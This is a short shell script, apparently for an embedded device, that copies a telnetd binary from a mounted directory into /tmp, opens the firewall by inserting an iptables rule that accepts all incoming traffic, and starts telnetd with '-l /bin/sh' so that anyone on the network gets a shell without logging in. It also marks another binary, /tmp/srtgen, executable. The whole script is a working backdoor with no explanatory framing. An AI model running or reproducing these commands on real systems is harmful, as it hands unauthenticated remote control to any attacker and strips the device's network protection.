cp /tmp/fuse_d/telnetd /tmp
chmod +x /tmp/telnetd
iptables -I INPUT -j ACCEPT
/tmp/telnetd -l /bin/sh &

chmod +x /tmp/srtgen

exit 0
